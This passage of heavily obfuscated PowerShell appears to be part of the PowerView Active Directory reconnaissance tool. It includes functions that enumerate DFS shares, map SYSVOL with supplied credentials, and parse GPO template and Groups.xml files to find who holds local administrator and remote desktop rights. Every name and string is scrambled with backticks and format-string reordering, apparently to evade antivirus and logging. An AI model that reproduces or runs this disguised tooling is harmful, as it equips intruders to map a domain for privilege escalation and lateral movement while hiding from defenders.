                        ${cO`MmenT_`SI`ze`_END} = ${cOmmeNT_`sIze_`ST`A`Rt} + 1
                        ${comMe`N`T`_S`ize} =   (  &("{4}{0}{2}{1}{3}" -f '-','DIT','cHIL','eM','GeT')  ("{1}{2}{3}{0}" -f'su','variaB','LE:Q6','RH'))."V`ALuE"::"T`oU`InT16"(${Blo`B_D`Ata}[${commen`T_`SiZe`_`st`A`RT}..${Co`MMen`T_siZ`E_`End}],0)
                        ${Co`mme`N`T_sT`ArT} = ${C`omm`ENt_SIze`_End} + 1
                        ${cOmM`eNt_e`ND} = ${cO`Mm`en`T_StaRT} + ${cOMMe`NT_S`iZE} - 1
                        if (${c`O`mmEnt_`SiZe} -gt 0)  {
                            ${com`meNT} =   ${y`94}::"U`N`Icode"."gEts`T`RinG"(${BL`Ob`_DatA}[${COMme`NT_sT`ARt}..${CoM`ment_`e`ND}])
                        }
                        ${PrEfiX_`T`IMEsT`AMp_`START} = ${cO`mmenT`_E`ND} + 1
                        ${PREf`Ix_`TImeSTaM`p`_E`Nd} = ${prEfI`X_tiMes`Ta`mP_`sta`Rt} + 7

                        ${P`R`EfiX_tiM`Es`TAMP} = ${B`LoB`_DaTA}[${p`ReFIx_tImesT`AmP`_s`TART}..${PRe`FIx_ti`mestAMP`_`end}] 
                        ${st`At`E_T`Ime`StAMP_stARt} = ${pr`e`Fix_timEs`TAm`p_E`ND} + 1
                        ${sta`TE`_TiM`esTa`m`P`_END} = ${ST`AT`e`_T`IMeSTam`p_S`TaRT} + 7
                        ${staTe_`T`ime`STA`mP} = ${bLO`B_`DaTA}[${st`AtE_TimeStA`mP`_STa`RT}..${S`TaTE_TI`me`s`TAMP_e`Nd}]
                        ${cOMmE`NT`_`TimEST`AmP_StArt} = ${s`TAte_T`IMEsTA`MP_eNd} + 1
                        ${co`Mm`ENT_tI`m`eSTAM`P_e`Nd} = ${c`omMent_TiMeST`AmP`_ST`Art} + 7
                        ${coM`MEn`T_TIMESt`AMP} = ${B`lOB_`DATA}[${CoMm`eNt`_TI`meStAmp_`StaRt}..${comME`N`T_Ti`M`EStA`M`p_END}]
                        ${ver`sIo`N_s`T`ARt} = ${COMMe`NT_tIm`ES`TA`MP_enD}  + 1
                        ${Ve`R`sI`on_ENd} = ${VeR`s`ION_sTA`Rt} + 3
                        ${V`ERSiON} =   ${Q6`R`hSu}::"TO`UINT32"(${BLob_D`A`Ta}[${V`er`s`ion`_sTART}..${V`eRSion`_`ENd}],0)

                        ${dfs`_TaR`gE`Tl`IST_BLoB`_Size_ST`Art} = ${veRsi`O`N_EnD} + 1
                        ${D`F`s_T`A`Rgetli`sT_bLOB_`SizE_end} = ${DFs_TARGe`T`LiS`T_B`lO`B_siZe`_S`TArt} + 3
                        ${dFS`_T`Ar`gET`LIst`_blob_`Size} =  (&("{0}{1}" -f 'cHilDit','eM') ("v"+"AR"+"i"+"aBL"+"e:Q6rHSU"))."Va`lUe"::"To`U`inT32"(${BLOB`_`Data}[${DFS_tArgE`TLiSt`_bLob_S`IZ`e`_`Start}..${dfS_`T`A`R`gEtlisT_BLo`B_sizE_`E`ND}],0)

                        ${Dfs`_`TaRgetLISt`_B`l`Ob_sTARt} = ${DfS_t`ARGEt`L`Ist_bloB_Si`ze_End} + 1
                        ${dfS_t`A`R`GeTLIsT_`Bl`ob_`E`Nd} = ${D`FS_tARGETl`ISt_BL`ob_`staRT} + ${dF`s_`T`ARgeTliS`T_Bl`oB_`SIZE} - 1
                        ${d`Fs`_`TaRGEtL`IS`T_B`LoB} = ${bL`OB`_daTA}[${DFs_T`ArGeT`LiST_bl`OB_`STA`Rt}..${dfS_`T`ARGeTLIst_b`lOB`_enD}]
                        ${REse`Rved_bL`O`B_`SiZe_`St`ArT} = ${D`FS_ta`R`ge`TList_B`loB_ENd} + 1
                        ${r`Ese`R`VED_bl`ob_SIZe_`E`ND} = ${rEsE`RVE`D`_`BLOb_SizE_S`Ta`Rt} + 3
                        ${RE`S`erv`Ed_BlOb_s`iZE} =  ( &("{2}{1}{0}"-f 'ABLE','ARI','GeT-v')  ("{0}{1}{2}" -f'q6r','h','SU')  -vaLuE)::"tO`UinT32"(${bLO`B_D`ATa}[${r`eSErVEd_BLoB_SiZ`E_`stA`Rt}..${rESe`RVed_Blob`_`Si`Z`e_e`Nd}],0)

                        ${resErVEd`_bL`O`B_sTarT} = ${R`EsE`RvED_BLoB_siZe`_enD} + 1
                        ${Re`sER`Ved_BLO`B_End} = ${ReSe`RvE`d_Blo`B`_STArt} + ${ReSe`RveD_BL`o`B_sizE} - 1
                        ${Rese`R`VE`D`_BLOB} = ${BL`Ob`_dAtA}[${ReSe`RvEd_BlOb`_s`TarT}..${R`E`S`erveD_Bl`O`B_enD}]
                        ${reFe`Rr`Al_Tt`L`_s`TARt} = ${rese`RVeD`_bL`o`B_E`Nd} + 1
                        ${r`eF`errAL_`TTl_end} = ${R`eFerrAl_ttL_`S`TaRt} + 3
                        ${REFerRA`l_t`TL} =  ${q6`RhSU}::"T`Ou`Int32"(${bl`Ob_d`AtA}[${rE`FErRAl_T`TL_S`T`Art}..${r`EFErRAL_`TT`l`_EnD}],0)

                        ${TARGE`T_`cO`UNT_S`TArt} = 0
                        ${t`ArGET_CoU`N`T_end} = ${t`ARGET_coUN`T_s`Ta`Rt} + 3
                        ${t`ARGeT_c`Ou`Nt} =  ${Q6`Rhsu}::"tOuIn`T`32"(${DFS`_TargEt`lI`s`T_b`lob}[${T`ARGEt`_`Count_St`ARt}..${TarG`eT`_`COunt_eNd}],0)
                        ${T`_oFFs`Et} = ${T`ARGET_coUnT_`e`Nd} + 1

                        for(${j}=1; ${J} -le ${tARGEt_`C`ount}; ${J}++){
                            ${Ta`RGet_eN`TrY`_`siZ`e_sTart} = ${T_o`FfS`Et}
                            ${tar`GE`T_En`TrY_`siZe_E`ND} = ${TARG`e`T_ENTRY`_S`I`z`e_st`ArT} + 3
                            ${taRgEt_`E`N`Try_`SI`ZE} =  (&("{1}{0}"-f'arIaBLe','v')  ("{0}{2}{1}" -f'Q6','hSU','R'))."VaL`Ue"::"toUIn`T`32"(${Dfs_tAR`g`etli`ST_bLob}[${tARG`ET_e`N`TRy_siZe`_staRT}..${TA`Rg`e`T_Ent`R`y_sIZe_END}],0)
                            ${T`ArG`ET_tIME`_sTAm`p`_S`TArt} = ${tArGET_E`Ntry_`sI`ZE`_e`Nd} + 1
                            ${TA`RG`eT_tIME_STAm`P`_`E`Nd} = ${T`Ar`GeT_tiMe_`s`TAMP_St`ArT} + 7

                            ${targEt_`Ti`M`E_STaMp} = ${D`FS`_t`A`RgE`TliST_B`LoB}[${Ta`R`G`ET_ti`Me_staMp_St`ARt}..${ta`R`g`Et`_Time_`sTamp_`END}]
                            ${TaRg`ET_s`Ta`TE_S`TA`RT} = ${targ`eT_`T`IMe`_stAmP_eNd} + 1
                            ${TA`R`GEt_`sTat`E_e`ND} = ${tARG`E`T_s`T`ATe_staRt} + 3
                            ${taRgE`T_`sTAte} =  (&("{1}{2}{4}{0}{3}" -f'lDI','g','Et-c','TEm','HI') ("{0}{2}{1}" -f'VaRi','Le:Q6RhsU','aB'))."VAL`Ue"::"Touin`T`32"(${d`F`S`_TaRgET`l`iST_bLOB}[${tARGET_stAt`E`_`S`TART}..${Targ`et`_Sta`TE`_END}],0)

                            ${TaR`g`et_T`YPe_s`T`ArT} = ${ta`RGeT_`s`TAt`e_E`ND} + 1
                            ${tA`RG`Et_T`yp`e_ENd} = ${Tar`g`et_`TYpE_sTaRT} + 3
                            ${tAr`GET_T`y`pe} =  (&("{0}{1}"-f 'GC','i')  ("VAR"+"I"+"A"+"BlE:Q6"+"RhsU"))."VA`LuE"::"touInT`32"(${df`s`_TaR`gETlIST_bloB}[${ta`RG`Et_`Ty`pe_s`Tart}..${TA`RGE`T`_TypE_`E`Nd}],0)

                            ${SE`R`VeR_na`me_SIze_`stArT} = ${T`AR`geT_TYp`e_E`Nd} + 1
                            ${S`E`RVer`_Name_`sIZE_e`Nd} = ${s`ERVer_nA`m`E_s`IZ`e_s`TArt} + 1
                            ${ser`V`eR_N`A`me_SIzE} =  (  &("{2}{1}{0}"-f 'E','abL','gEt-vAri')  ("{0}{1}" -f'Q6Rh','su') )."vAL`UE"::"T`ouInT`16"(${dF`S_T`ArgE`Tl`ist_`Bl`OB}[${S`ERv`er_`Name_`sI`ZE_StA`RT}..${s`ErVe`R`_nAme`_SIZe_EnD}],0)

                            ${seR`VER_`NaM`E_s`TArt} = ${seRv`Er_Na`ME_`SizE_eNd} + 1
                            ${S`ER`VeR`_NAme_E`Nd} = ${S`erv`er_naME_`st`ART} + ${SE`RVEr`_nAmE_s`iZE} - 1
                            ${S`ErV`ER`_nAMe} =  (  &("{1}{0}"-f'iteM','gEt-') ('v'+'ariabL'+'e:Y94') )."v`AlUE"::"un`iCOde"."gETS`TrI`Ng"(${dF`S`_TAR`GEt`l`ISt_BLoB}[${SER`Ve`R_Na`Me_StART}..${SErvE`R_NaME`_ENd}])

                            ${Sh`ArE_nAME`_Siz`e_S`TArt} = ${sEr`VER_n`AmE_e`Nd} + 1
                            ${S`HaRE`_naME_S`iz`e`_E`ND} = ${SharE_`NaME_S`iZe_s`Ta`RT} + 1
                            ${shaRe`_`Name_sIZe} =   (  &("{1}{2}{0}" -f'AbLe','geT-','vaRi') ("{0}{1}" -f'Q6','rhSu') -vaL  )::"T`ou`Int16"(${dfS`_`Targ`ET`LisT`_blOB}[${SH`ARE`_`NAmE_s`Iz`e_StART}..${S`hare`_NamE`_SiZE`_E`Nd}],0)
                            ${ShaRE_nA`m`E`_StARt} = ${SHarE`_Nam`E_`S`iZe`_enD} + 1
                            ${sH`Ar`E_NAmE`_e`Nd} = ${s`ha`RE_NAm`e_ST`ARt} + ${sha`Re_NAm`E_`S`IZe} - 1
                            ${sH`ARe`_na`Me} =  ( &("{0}{2}{1}" -f 'GEt','rIaBle','-Va') ("{1}{0}"-f'94','y')  -VALu  )::"UNiC`oDE"."gEt`STR`inG"(${dfS_`TArgETLIs`T_B`L`ob}[${ShA`RE_NAme`_`STaRt}..${S`h`AR`E_name`_eND}])

                            ${tarGE`T`_LiSt} += "\\$server_name\$share_name"
                            ${t_OFf`s`et} = ${sh`Are_name`_`END} + 1
                        }
                    }
                }
                ${oF`FSEt} = ${bloB_D`A`TA_E`Nd} + 1
                ${DFS_P`Kt_pr`OPer`Ti`eS} = @{
                    ("{1}{0}"-f'e','Nam') = ${bL`Ob_`Name}
                    ("{0}{1}"-f'Pr','efix') = ${PrEf`Ix}
                    ("{1}{2}{3}{0}"-f'st','Targ','e','tLi') = ${targ`ET_lI`st}
                }
                ${o`B`J`eCt_list} += &("{0}{1}{2}"-f 'N','ew-','Object') -TypeName ("{1}{0}" -f 'ect','PSObj') -Property ${dfs`_`Pkt_proP`Er`TIeS}
                ${pr`ef`ix} = ${n`Ull}
                ${bL`oB_`Name} = ${nU`LL}
                ${T`ARG`eT_li`St} = ${n`Ull}
            }

            ${s`ERve`RS} = @()
            ${OBj`ec`T_LIst} | &("{4}{3}{0}{1}{2}"-f'h','-Objec','t','ac','ForE') {
                if (${_}."tar`gE`TlIst") {
                    ${_}."T`ARg`EtlIst" | &("{1}{3}{4}{0}{2}" -f'E','F','ach-Object','o','r') {
                        ${S`ERV`ErS} += ${_}.("{1}{0}" -f'plit','s').Invoke('\')[2]
                    }
                }
            }

            ${SERV`e`Rs}
        }

        function GeT-`Dom`A`indfs`s`HAre`V1 {
            [CmdletBinding()]
            Param(
                [String]
                ${DO`mA`in},

                [String]
                ${SEAr`chBa`sE},

                [String]
                ${S`erVeR},

                [String]
                ${s`EAr`ChsCO`PE} = ("{2}{0}{1}" -f 'tre','e','Sub'),

                [Int]
                ${rEsULt`P`A`GE`sIZe} = 200,

                [Int]
                ${SE`RveR`TiME`Li`MIT},

                [Switch]
                ${tOMb`S`ToNE},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${C`R`EdeNtI`Al} =   ( &("{1}{0}" -f'e','vAriabL')  ("{1}{0}{2}" -f 'K','p','fEZn'))."v`ALuE"::"EM`PtY"
            )

            ${DfsS`EA`R`cher} = &("{1}{4}{0}{2}{5}{3}"-f'-D','Ge','oma','earcher','t','inS') @PSBoundParameters

            if (${Df`sS`eARCH`er}) {
                ${DfSS`hAr`eS} = @()
                ${dFS`sEA`RCh`eR}."f`Il`Ter" = (("{4}{0}{2}{1}{6}{5}{3}"-f '&(obje','s','ctCla','))','(','s','s=fTDf'))

                try {
                    ${RES`UltS} = ${Df`ss`EAr`cHEr}.("{0}{2}{1}"-f'Fin','ll','dA').Invoke()
                    ${RE`S`ULts} | &("{0}{2}{3}{1}"-f'W','ject','he','re-Ob') {${_}} | &("{2}{1}{0}"-f 'ect','h-Obj','ForEac') {
                        ${P`RO`PeRTIes} = ${_}."proPE`R`TIes"
                        ${R`Em`oTEnamEs} = ${P`RoPERT`IeS}."R`eMOteSerV`erNA`me"
                        ${P`Kt} = ${p`ROP`ErtI`es}."p`Kt"

                        ${dfSsh`A`REs} += ${Re`M`OTe`NameS} | &("{4}{1}{0}{2}{3}" -f'ch-Ob','a','jec','t','ForE') {
                            try {
                                if ( ${_}.("{2}{1}{0}" -f 'ins','ta','Con').Invoke('\') ) {
                                    &("{2}{1}{0}"-f'ject','Ob','New-') -TypeName ("{2}{0}{1}" -f 'O','bject','PS') -Property @{("{0}{1}" -f 'Na','me')=${PROpEr`TI`Es}."n`AmE"[0];("{5}{4}{2}{0}{1}{3}" -f 'v','er','Ser','Name','emote','R')=${_}.("{1}{0}"-f'plit','s').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{0}{3}{1}{2}"-f'W','e-Ver','bose','rit') ('['+'Get-Dom'+'ainDFS'+'Shar'+'e] '+'G'+'e'+'t'+'-Domain'+'DFSS'+'hareV1 '+'e'+'rror '+'i'+'n '+'pa'+'rsin'+'g '+'DF'+'S '+'sh'+'are '+': '+"$_")
                            }
                        }
                    }
                    if (${RESu`l`Ts}) {
                        try { ${rE`su`ltS}.("{0}{1}" -f 'dispo','se').Invoke() }
                        catch {
                            &("{2}{0}{1}"-f'e-V','erbose','Writ') ('[Get-Doma'+'i'+'nDFS'+'Share] '+'Ge'+'t-'+'Domai'+'nDFSSha'+'re'+'V1'+' '+'e'+'rror '+'d'+'is'+'posing '+'of'+' '+'th'+'e '+'Resul'+'ts '+'obj'+'ect:'+' '+"$_")
                        }
                    }
                    ${DfsS`ea`Rch`Er}.("{0}{1}" -f'di','spose').Invoke()

                    if (${p`kT} -and ${p`KT}[0]) {
                        &("{1}{2}{0}" -f'kt','Pa','rse-P') ${p`kT}[0] | &("{1}{0}{2}"-f'Each-Objec','For','t') {

                            if (${_} -ne ("{1}{0}" -f 'l','nul')) {
                                &("{0}{1}{2}"-f 'New-Ob','je','ct') -TypeName ("{1}{0}{2}" -f 'c','PSObje','t') -Property @{("{1}{0}"-f'e','Nam')=${PROP`Er`TieS}."N`AMe"[0];("{3}{4}{0}{2}{1}"-f't','Name','eServer','Re','mo')=${_}}
                            }
                        }
                    }
                }
                catch {
                    &("{1}{3}{0}{2}" -f'i','Write-Wa','ng','rn') ('[Get-'+'D'+'o'+'mainDFSShare'+'] '+'G'+'et-DomainDFSS'+'hareV'+'1'+' '+'er'+'ror '+': '+"$_")
                }
                ${dF`ssH`ArES} | &("{1}{3}{2}{0}"-f'ect','So','t-Obj','r') -Unique -Property ("{2}{0}{3}{1}" -f 'emoteServ','e','R','erNam')
            }
        }

        function g`eT-doMA`I`NdFs`shar`Ev2 {
            [CmdletBinding()]
            Param(
                [String]
                ${dOMA`iN},

                [String]
                ${SE`Ar`c`hBaSe},

                [String]
                ${seR`V`er},

                [String]
                ${SE`ArCHSC`o`Pe} = ("{1}{0}" -f 'ee','Subtr'),

                [Int]
                ${REs`UlTPAgE`siZe} = 200,

                [Int]
                ${se`R`V`erTimELiMit},

                [Switch]
                ${T`omB`Stone},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${cr`EdEnti`Al} =  (  &('lS')  ('variab'+'le'+':PKf'+'ezn')  )."va`lUe"::"EM`Pty"
            )

            ${Df`Ss`EaRcheR} = &("{1}{2}{5}{0}{4}{3}"-f 'omai','G','et-','Searcher','n','D') @PSBoundParameters

            if (${df`SS`eA`RcheR}) {
                ${dFsSH`Ar`Es} = @()
                ${DFSs`Ea`R`cHeR}."FIl`T`eR" = ((("{6}{7}{0}{2}{3}{5}{4}{1}"-f'Clas','))','s=m','sDFS-L','nkv2','i','(&(o','bject')))
                ${N`ULL} = ${dFSsEa`RC`h`Er}."prOper`T`ieST`oLOAD".("{2}{1}{0}" -f 'e','Rang','Add').Invoke((("{1}{2}{3}{0}" -f 'v2','msdfs-','linkp','ath'),("{3}{2}{0}{1}"-f 'L','istv2','-Target','msDFS')))

                try {
                    ${RE`su`lts} = ${d`Fs`searCHER}.("{1}{2}{0}"-f 'l','FindA','l').Invoke()
                    ${rE`sU`lTS} | &("{1}{2}{0}{3}"-f'Obje','Where','-','ct') {${_}} | &("{0}{1}{2}" -f'ForEach-Obj','ec','t') {
                        ${PRo`p`erTIEs} = ${_}."pRO`PERti`ES"
                        ${TARgeT`_`li`st} = ${pr`opeRt`ies}.'msdfs-targetlistv2'[0]
                        ${X`ml} = [xml] (  &("{1}{0}{2}"-f 'T-','Ge','ItEM') ('v'+'arIA'+'BL'+'E:y94') )."V`Alue"::"Uni`c`OdE"."g`etStR`inG"(${TArGE`T_L`IST}[2..(${TAR`G`Et_l`isT}."le`NGTh"-1)])
                        ${dfsS`HAr`Es} += ${x`mL}."TARg`E`TS"."cH`I`ldn`odes" | &("{2}{1}{0}{3}"-f'Objec','h-','ForEac','t') {
                            try {
                                ${tAR`gET} = ${_}."IN`NE`RTEXt"
                                if ( ${T`AR`Get}.("{1}{0}"-f'tains','Con').Invoke('\') ) {
                                    ${d`Fs`RoOt} = ${TA`Rg`ET}.("{1}{0}" -f 'lit','sp').Invoke('\')[3]
                                    ${shaR`ENa`mE} = ${PRO`PEr`TiES}.'msdfs-linkpathv2'[0]
                                    &("{1}{3}{0}{2}"-f 'c','Ne','t','w-Obje') -TypeName ("{0}{1}{2}"-f 'P','SObjec','t') -Property @{("{1}{0}"-f'ame','N')="$DFSroot$ShareName";("{3}{2}{0}{1}" -f'verNam','e','Ser','Remote')=${T`AR`GET}.("{0}{1}" -f'sp','lit').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{0}{3}{2}{1}" -f 'Write','rbose','Ve','-') ('[Get-Domai'+'nD'+'FSShar'+'e] '+'Get'+'-Doma'+'i'+'nDFSShareV2 '+'error'+' '+'in'+' '+'pa'+'rsi'+'ng '+'target'+' '+': '+"$_")
                            }
                        }
                    }
                    if (${R`ESu`Lts}) {
                        try { ${R`eSu`lTs}.("{0}{1}"-f'disp','ose').Invoke() }
                        catch {
                            &("{1}{3}{0}{2}" -f 'e-','Wri','Verbose','t') ('[Ge'+'t-D'+'omai'+'nDFSS'+'hare]'+' '+'E'+'rror '+'d'+'isp'+'osing '+'o'+'f '+'the'+' '+'Re'+'sults '+'obj'+'e'+'ct: '+"$_")
                        }
                    }
                    ${dfSS`Ea`RC`hER}.("{0}{2}{1}" -f 'd','se','ispo').Invoke()
                }
                catch {
                    &("{2}{1}{0}{3}" -f '-','ite','Wr','Warning') ('[G'+'e'+'t'+'-Do'+'mainD'+'FSShare] '+'Get-'+'D'+'omain'+'DFSS'+'hareV2 '+'er'+'ror'+' '+': '+"$_")
                }
                ${dFSS`H`AREs} | &("{1}{2}{0}"-f 'Object','Sor','t-') -Unique -Property ("{4}{1}{0}{2}{3}"-f 'e','eServ','rNam','e','Remot')
            }
        }
    }

    PROCESS {
        ${d`FSs`haReS} = @()

        if (${pSBO`UNd`P`Ara`metErS}[("{1}{0}" -f 'n','Domai')]) {
            ForEach (${TA`RgETD`oMAIN} in ${dO`MAin}) {
                ${SeAR`cHEr`A`R`g`UmEnts}[("{0}{1}"-f 'Doma','in')] = ${TARG`eT`DO`mAIN}
                if (${V`eR`SIOn} -match (('all{0}1')-F[cHAR]124)) {
                    ${d`FsSha`Res} += &("{0}{3}{2}{4}{1}"-f 'G','reV1','omainD','et-D','FSSha') @SearcherArguments
                }
                if (${v`ERsION} -match ((("{1}{0}{2}" -f'E2','all','C2')) -crEPlACE ([CHar]69+[CHar]50+[CHar]67),[CHar]124)) {
                    ${Df`ssha`R`Es} += &("{1}{6}{3}{5}{4}{0}{2}" -f'SShar','Get','eV2','Doma','DF','in','-') @SearcherArguments
                }
            }
        }
        else {
            if (${vEr`SiOn} -match ((("{1}{0}"-f 'j1','allHs'))."R`Epla`CE"(([cHar]72+[cHar]115+[cHar]106),'|'))) {
                ${DfSSh`Ar`ES} += &("{4}{0}{2}{3}{1}" -f'ma','SShareV1','inD','F','Get-Do') @SearcherArguments
            }
            if (${vE`RSiON} -match ((("{0}{1}" -f 'allQD','s2'))."re`pL`ACE"(([CHAr]81+[CHAr]68+[CHAr]115),'|'))) {
                ${Df`sShAr`eS} += &("{4}{5}{2}{0}{3}{1}" -f'a','V2','ainDFSSh','re','Get-Do','m') @SearcherArguments
            }
        }

        ${DFS`shA`R`es} | &("{0}{2}{1}" -f'Sort-O','ect','bj') -Property (("{0}{1}{2}{3}" -f'Remote','Serve','rNam','e'),("{1}{0}" -f'ame','N')) -Unique
    }
}

function gET-`GP`Tt`mPl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}" -f 'PS','ShouldProc','ess'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(MANDATory = ${T`Rue}, vaLuEfrOmPipELIne = ${tR`Ue}, vAluEfroMPipElInEbYPRopErTYNAme = ${T`RuE})]
        [Alias({"{0}{3}{2}{1}"-f'g','ilesyspath','cf','p'}, {"{0}{1}" -f'Pat','h'})]
        [String]
        ${gP`TTMpL`pa`TH},

        [Switch]
        ${o`U`TPuTOb`Je`CT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRED`En`TI`AL} =   ${pkfe`ZN}::"Em`ptY"
    )

    BEGIN {
        ${M`AP`PeDp`Aths} = @{}
    }

    PROCESS {
        try {
            if ((${gPTTM`P`lpatH} -Match ((("{0}{4}{3}{1}{2}" -f'aNsaNsaNsaN','.','*','aNs','s.*aNs'))."R`EPlAcE"(([cHAr]97+[cHAr]78+[cHAr]115),[STRINg][cHAr]92))) -and (${p`sBOuN`dP`AramE`T`eRS}[("{0}{2}{1}" -f'Credent','al','i')])) {
                ${s`ysV`oLPAth} = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if (-not ${MapPE`dP`AT`hs}[${sY`SVO`LPatH}]) {

                    &("{2}{0}{3}{4}{1}"-f 'd-','ection','Ad','Remo','teConn') -Path ${SyS`VolP`Ath} -Credential ${C`REDE`NtIAl}
                    ${maPPED`PA`ThS}[${SY`s`V`oLpATH}] = ${t`Rue}
                }
            }

            ${T`ArgeTGpT`Tm`p`lpa`Th} = ${GPT`TMPLP`AtH}
            if (-not ${t`ARgeT`G`pttmPLPAth}.("{1}{0}" -f 'With','Ends').Invoke(("{0}{1}"-f'.','inf'))) {
                ${TA`R`GeT`gPTT`m`plPatH} += ((("{9}{0}{2}{10}{11}{1}{6}{3}{5}{13}{8}{4}{7}{14}{12}" -f'INE48kM','oft48k','icr','s NT','t48kGpt','4','Window','Tmpl.i','ecEdi','48kMACH','o','s','f','8kS','n'))."RE`PlACE"('48k',[StRinG][cHAR]92))
            }

            &("{0}{1}{2}{3}" -f'Write','-Ve','rbo','se') ('[G'+'et-'+'Gpt'+'Tmp'+'l] '+'Parsi'+'ng '+'GptTmp'+'lPath'+': '+"$TargetGptTmplPath")

            if (${p`SBo`UnD`pARAmEt`E`Rs}[("{2}{3}{1}{0}"-f'ect','tObj','O','utpu')]) {
                ${coN`T`eN`TS} = &("{4}{3}{0}{2}{1}"-f 'I','ontent','niC','et-','G') -Path ${targE`Tg`pt`TmPLP`ATh} -OutputObject -ErrorAction ("{1}{0}" -f 'p','Sto')
                if (${COn`Te`NTS}) {
                    ${CON`Te`Nts} | &("{0}{1}{2}" -f'Add-','Membe','r') ("{2}{3}{0}{1}" -f 'prope','rty','N','ote') ("{0}{1}" -f'Pat','h') ${TA`RGEtGPT`TmPl`P`ATh}
                    ${co`NtEn`Ts}
                }
            }
            else {
                ${CONt`eN`Ts} = &("{0}{1}{4}{2}{3}"-f 'Get','-I','nt','ent','niCo') -Path ${TarGE`TgPttm`p`L`pAtH} -ErrorAction ("{1}{0}"-f'op','St')
                if (${Cont`en`TS}) {
                    ${con`Ten`Ts}[("{0}{1}" -f 'Pat','h')] = ${Tar`gE`T`GPttmP`lPaTH}
                    ${C`ONtEN`Ts}
                }
            }
        }
        catch {
            &("{3}{1}{0}{2}" -f'V','ite-','erbose','Wr') ('['+'Get-Gpt'+'Tm'+'pl] '+'Er'+'ror '+'par'+'sing'+' '+"$TargetGptTmplPath "+': '+"$_")
        }
    }

    END {

        ${mApp`E`D`PathS}."k`Eys" | &("{3}{0}{4}{2}{1}"-f 'orEac','bject','-O','F','h') { &("{0}{2}{1}{3}" -f'Remove-','t','Remo','eConnection') -Path ${_} }
    }
}

function GE`T-GroUPS`x`Ml {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{4}{0}{3}" -f'dProc','hou','PSS','ess','l'}, '')]
    [OutputType({"{3}{2}{1}{0}" -f 'XML','Groups','iew.','PowerV'})]
    [CmdletBinding()]
    Param (
        [Parameter(MaNDAToRy = ${T`Rue}, VAluEFROMpipeLine = ${tr`UE}, VALUeFROMPIPELInEBYpRoPerTYNamE = ${TR`UE})]
        [Alias({"{0}{1}" -f 'Pa','th'})]
        [String]
        ${g`RoU`pS`xmLp`Ath},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`e`de`NtiAl} =  ( &("{0}{2}{1}" -f'var','blE','iA') ("P"+"kFEZN")  -vAlUeO)::"EMP`TY"
    )

    BEGIN {
        ${maPP`E`dPAths} = @{}
    }

    PROCESS {
        try {
            if ((${GR`OupsX`mlPAth} -Match ((("{3}{1}{4}{5}{2}{0}" -f 'Cfk.*','fk','Cfk','C','CfkCfk','Cfk.*'))."R`eplAcE"(([CHAR]67+[CHAR]102+[CHAR]107),[stRiNG][CHAR]92))) -and (${PsB`oundp`A`RameT`eRs}[("{0}{2}{1}"-f'Creden','l','tia')])) {
                ${Sys`Volp`ATh} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if (-not ${ma`P`peDpaT`hS}[${SYsvO`Lpa`TH}]) {

                    &("{0}{3}{1}{5}{4}{2}" -f'Add-','mo','tion','Re','eConnec','t') -Path ${syS`V`OlpA`Th} -Credential ${CrEDe`N`T`Ial}
                    ${m`A`pPeDpaTHS}[${s`y`sVOLPAth}] = ${tR`Ue}
                }
            }

            [XML]${GrOU`PSx`MLCoNT`eNT} = &("{2}{1}{0}" -f'tent','n','Get-Co') -Path ${G`R`OUpsxm`lpatH} -ErrorAction ("{1}{0}"-f'op','St')

            ${gR`OUp`sXMLco`NteNT} | &("{2}{1}{3}{0}" -f 'l','el','S','ect-Xm') ("{2}{3}{0}{1}" -f 'ups/Gr','oup','/Gr','o') | &("{0}{1}{2}"-f'Sel','e','ct-Object') -ExpandProperty ("{0}{1}"-f 'n','ode') | &("{0}{3}{2}{1}"-f 'Fo','Object','Each-','r') {

                ${GROupn`A`mE} = ${_}."pRO`PEr`TiES"."grOU`p`NAmE"

                ${GrouP`S`ID} = ${_}."P`ROp`ERtiEs"."Gro`U`PSid"
                if (-not ${G`Ro`UP`sId}) {
                    if (${gR`Oup`NAMe} -match ("{3}{2}{0}{1}" -f'str','ators','i','Admin')) {
                        ${g`ROUPs`ID} = ("{0}{2}{1}"-f'S-1-5-','-544','32')
                    }
                    elseif (${gR`ouPnA`me} -match ("{2}{0}{4}{1}{3}"-f 'ot','esk','Rem','top','e D')) {
                        ${grO`UpsID} = ("{0}{2}{1}{3}" -f 'S-1','5','-5-32-','55')
                    }
                    elseif (${Gr`Oup`NA`me} -match ("{0}{1}"-f'Gu','ests')) {
                        ${gr`O`UPSID} = ("{2}{0}{1}"-f '2-','546','S-1-5-3')
                    }
                    else {
                        if (${psbOUN`D`PArA`MetErS}[("{2}{0}{1}"-f 'red','ential','C')]) {
                            ${GROup`s`iD} = &("{0}{2}{1}{3}"-f 'C','tTo-S','onver','ID') -ObjectName ${G`RO`UPnAmE} -Credential ${cr`ed`E`NtIAL}
                        }
                        else {
                            ${gR`ouP`sID} = &("{2}{0}{1}{3}"-f'nvert','To-SI','Co','D') -ObjectName ${gR`ouP`N`AMe}
                        }
                    }
                }

                ${m`EMBe`Rs} = ${_}."P`RO`peRTies"."mE`mbERs" | &("{3}{4}{0}{1}{2}" -f't-Obj','ec','t','S','elec') -ExpandProperty ("{0}{2}{1}"-f 'Mem','r','be') | &("{0}{3}{2}{1}" -f 'Wh','ect','re-Obj','e') { ${_}."AC`TIOn" -match 'ADD' } | &("{2}{0}{1}" -f'rEach-Obje','ct','Fo') {
                    if (${_}."S`ID") { ${_}."s`Id" }
                    else { ${_}."n`Ame" }
                }

                if (${Mem`B`ERs}) {

                    if (${_}."FI`l`TeRs") {
                        ${F`Il`TeRS} = ${_}."FILtE`RS".("{1}{0}{2}"-f 'um','GetEn','erator').Invoke() | &("{2}{0}{1}{3}" -f 'orEa','ch-Obj','F','ect') {
